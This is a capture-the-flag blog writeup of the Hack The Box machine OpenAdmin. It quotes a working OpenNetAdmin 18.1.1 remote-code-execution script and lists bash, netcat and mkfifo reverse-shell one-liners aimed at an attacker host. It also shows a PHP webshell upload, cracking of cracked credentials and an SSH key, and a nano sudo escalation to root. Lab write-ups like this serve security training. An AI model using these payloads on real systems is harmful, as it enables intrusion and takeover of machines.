---
layout: post
title:  "HTB Writeup [Linux - Easy] - OpenAdmin (Intro to Dante Track #2)"
---

![OpenAdmin](/assets/OpenAdmin/OpenAdmin.png)

### Summary
- A **Linux machine** with port 80 that reveals a *vulnerable web application*.
- *Exploiting the application,* we gain access as `www-data`.
- We find **credentials in the database configuration file** which we use to *pivot to another user* which has access to a *special folder*.
- *Browsing the special folder and checking listening ports,* we find an **internal website being served on a high port**.
- *On the website,* logging in presents us with an **SSH key of another user** that we crack the passphrase for using `John`.
- The third user has **sudo privileges** with `nano` which we use to **privesc**.

---

### Nmap
We start off with the usual nmap scan and we find two open ports:
1. SSH
2. HTTP

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
*going to port 80,* we see the default apache2 web page:

![Apache-Default-Page](/assets/OpenAdmin/Apache-Default-Page.jpg)

### Web Directory Bruteforcing

*using the dirb `common.txt` wordlist with gobuster,* we find two directories:
1. `/artwork`
2. `/music`

we browse to them after opening up `burp` and proxying the traffic through it.

This is because burp would log all the traffic and will show us all the requests made by the website. This can show us a lot of hidden directories.

### Finding hidden content

*after pressing `login` on the `music` directory web page,* we get redirected to `/ona`

![music-login](/assets/OpenAdmin/music-login.jpg)

![ona-home](/assets/OpenAdmin/ona-home.jpg)

### Version-based Exploit Search

we take note of the version `18.1.1` and search for exploits right away!

![ona-exploit](/assets/OpenAdmin/ona-exploit.jpg)

we look at the one from **exploit-db**:

```
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

### Basic Exploit Analysis

*Analyzing the exploit,* it looks like a bash script given the shebang `#!/bin/bash`.

it takes a `url` as the argument and reads a command from the user to include it in the request.

*since it doesn't look malicious,* we run it and give it the url of the application `http://10.10.10.171/ona/` as an argument

```bash
exploit.sh http://10.10.10.171/ona/
```

and we get command execution!

![RCE](/assets/OpenAdmin/RCE.jpg)

### Trying to get a real shell

we try to get a full-fledged shell using the standard reverse shell payloads:
1. `bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1`
2. `nc -nv <LHOST> <LPORT> -e /bin/bash`
3. `rm /tmp/pipe; mkfifo /tmp/pipe; /bin/sh -i < /tmp/pipe 2>&1 | nc <LHOST> <LPORT> > /tmp/pipe; rm /tmp/pipe`

but no dice :/

we decide to upload a **php reverse shell** instead using the one in `/usr/share/webshells`

![upload-rev](/assets/OpenAdmin/upload-rev.jpg)

the reverse shell connects back when we visit `http://10.10.10.171/ona/revvy.php` and we're good to go :D

![rev-connect-1](/assets/OpenAdmin/rev-connect-1.jpg)

![rev-connect-2](/assets/OpenAdmin/rev-connect-2.jpg)

### Improving our shell

we then upgrade our shell to full tty as normal

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'` > `CTRL + Z` > `stty raw -echo` > `fg` > `export SHELL=/bin/bash && export TERM=xterm-256color
```


### Searching for custom content

we start by enumerating the web root and find a folder called `internal` owned by the user `jimmy` which we cannot access. This gets me to think that we probably would have to **pivot to that user** if we were to read the contents.

```
bash-4.4$ ls -la /var/www/
total 16
drwxr-xr-x  4 root     root     4096 Nov 22  2019 .
drwxr-xr-x 14 root     root     4096 Nov 21  2019 ..
drwxr-xr-x  6 www-data www-data 4096 Mar 19 11:31 html
drwxrwx---  2 jimmy    internal 4096 Mar 19 14:08 internal
lrwxrwxrwx  1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
```

*looking at the number of files inside the `ona` directory,* they turn out to be 1324 files :D
taking a look in every one of them is not feasable by any means. so we look for stuff that might contain something useful.

### Creds in DB settings config file

*after some considerable time,* we find the file `database_settings.inc.php` inside `/var/www/ona/local/config`. It contained the username and password for the database user:

```php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```

This looks promising :D
The `n1nj4W4rri0R!` password worked with the `ona_sys` and we start our enumerating the database.

### Local DB Enumeration

we find a table called `users` inside that contained both the username and password hashes of `admin` and `guest`

```
bash-4.4$ mysql -u ona_sys -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 48
Server version: 5.7.28-0ubuntu0.18.04.4 (Ubuntu)
Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.
Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ona_default        |
+--------------------+
2 rows in set (0.00 sec)
```

```
mysql> use ona_default;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```
mysql> show tables;
+------------------------+
| Tables_in_ona_default  |
+------------------------+
| blocks                 |
| configuration_types    |
| configurations         |
| custom_attribute_types |
| custom_attributes      |
| dcm_module_list        |
| device_types           |
| devices                |
| dhcp_failover_groups   |
| dhcp_option_entries    |
| dhcp_options           |
| dhcp_pools             |
| dhcp_server_subnets    |
| dns                    |
| dns_server_domains     |
| dns_views              |
| domains                |
| group_assignments      |
| groups                 |
| host_roles             |
| hosts                  |
| interface_clusters     |
| interfaces             |
| locations              |
| manufacturers          |
| messages               |
| models                 |
| ona_logs               |
| permission_assignments |
| permissions            |
| roles                  |
| sequences              |
| sessions               |
| subnet_types           |
| subnets                |
| sys_config             |
| tags                   |
| users                  |
| vlan_campuses          |
| vlans                  |
+------------------------+
40 rows in set (0.00 sec)
```

```
mysql> select * from users;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2022-03-19 16:59:19 | 2022-03-19 16:59:19 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec) 
```

the hashes appear to be `MD5` ones. and we crack them and find out:
1. user `admin` has a password of `admin`
2. user `guest` has a password of `test`

### The usernames and passwords we have

we now have 3 passwords on our list:
1. n1nj4W4rri0R!
2. admin
3. test

*and from a quick `cat /etc/passwd | grep bash`*, we know that our user list is:
1. jimmy
2. joanna
3. root

we try those creds out and find that the password `n1nj4W4rri0R!` works for the `jimmy` user.

```
$ ssh jimmy@10.10.10.171
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Mar 19 17:18:54 UTC 2022

  System load:  0.0               Processes:             176
  Usage of /:   31.0% of 7.81GB   Users logged in:       0
  Memory usage: 14%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Mar 19 11:39:02 2022 from 10.10.16.3
```

we start searching through his home folder. but we find nothing right away. so we turn towards that directory `/var/www/internal` to see what it looks like.

```
-bash-4.4$ ls -la
total 20
drwxrwx--- 2 jimmy internal 4096 Mar 19 17:20 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 3058 Mar 19 14:08 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Mar 19 13:54 main.php
```

### Finding unusual files

it contained those php files.

*while browsing through the contents,* we find out that if the user managed to log in with the correct password on `index.php`, he would get redirected to `main.php` which pulls out the contents of `/home/joanna/.ssh/id_rsa` which is the ssh key for the `joanna` user.

`index.php` contents:
```php
<h2>Enter Username and Password</h2>
<div class = "container form-signin">
<h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
  <?php
    $msg = '';

    if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
      if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
          $_SESSION['username'] = 'jimmy';
          header("Location: /main.php");
      } else {
          $msg = 'Wrong username or password.';
      }
    }
 ?>
</div> <!-- /container -->
```

main.php contents:
```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

getting the ssh key for the `joanna` user should be interesting. but we won't be able to access those webpages unless they were in the `/var/www/html` directory and were both **readable and executable** by the `www-data` user. There has to be some other way...

### Moving along other privesc paths looking for information

I don't get any ideas right off the bat. so I go ahead and use `linpeas.sh` to search for other ways to escalate my privileges.

we go down many different paths, including cracking the `sha512` hash inside the `index.php` file within the `internal` directory (the password was `Revealed`). and re-using it with all the users. but no dice :\

### Finding another high port listening *locally*

*but we do notice something we haven't paid attention to the first time,* port **52846** is listening *internally*. *on our first look,* we were pre-occupied with the `mysql` port and missed that high one.

```
tcp    LISTEN   0        80              127.0.0.1:3306           0.0.0.0:*     
tcp    LISTEN   0        128             127.0.0.1:52846          0.0.0.0:*     
tcp    LISTEN   0        128         127.0.0.53%lo:53             0.0.0.0:*     
tcp    LISTEN   0        128               0.0.0.0:22             0.0.0.0:*     
tcp    LISTEN   0        128                     *:80                   *:*     
tcp    LISTEN   0        128                  [::]:22                [::]:* 
```

we know that we should get the contents of `joanna`'s ssh key if we log in with the correct username and password. and we happen to have those:
- username: `jimmy`
- password: `Revealed`

**And, if we didn't,** we had `write` access to the php authentication file and could modify it ;)

### SSH Tunneling to expose the internal port

so we create an `SSH tunnel` to bring out that internal `52846` port to our `localhost` on port `8888`

```bash
ssh jimmy@10.10.10.171 -L 8888:127.0.0.1:52846
```

and we see the login form:

![hidden-port](/assets/OpenAdmin/hidden-port.jpg)

### SSH Key for `Joanna`

after logging in, we get the ssh key for the `joanna` user!

![joanna-key](/assets/OpenAdmin/joanna-key.jpg)

we copy it to our kali machine and we change its permissions using `chmod 600 joanna_key`

and we use it to log in. but it requires a passphrase :D

### Cracking the SSH passphrase using `John`

we use the tool `ssh2john` to change the ssh key into a format that's crackable by `john`. we crack the password using the `rockyou.txt` wordlist.

```bash
ssh2john joanna_key > joanna_john
john joanna_john --wordlist=/usr/share/wordlists/rockyou.txt
```

the password turns out to be `bloodninjas`

we use it and can successfully ssh in as the `joanna` user:

```
$ ssh -i joanna_key joanna@10.10.10.171
Enter passphrase for key 'joanna_key': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Mar 19 17:45:54 UTC 2022

  System load:  0.01              Processes:             169
  Usage of /:   30.9% of 7.81GB   Users logged in:       0
  Memory usage: 8%                IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
```

### Joanna can root the box. SUDO style :D

*after logging in,* we find no interesting files in her home directory. but she shows to have interesting permissions using `sudo -l -l`

```
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:

Sudoers entry:
    RunAsUsers: ALL
    Options: !authenticate
    Commands:
        /bin/nano /opt/priv
```

**that's it!** we can now escalate privileges to root.
A quick search on GTFO bins (https://gtfobins.github.io) reveals a way we can do that using `CTRL+R` followed by `CTRL+X`

![gtfo](/assets/OpenAdmin/gtfo.jpg)

we use the command `/bin/nano /opt/priv` and issue a command as root `chmod +s /bin/bash`. This makes the `bash` shell run with `setuid` bit. and makes us able to run as the `root` use when using `bash` with the `-p` flag. we do that and voala :D

![chmod-bash](/assets/OpenAdmin/chmod-bash.jpg)

![rooted](/assets/OpenAdmin/rooted.jpg)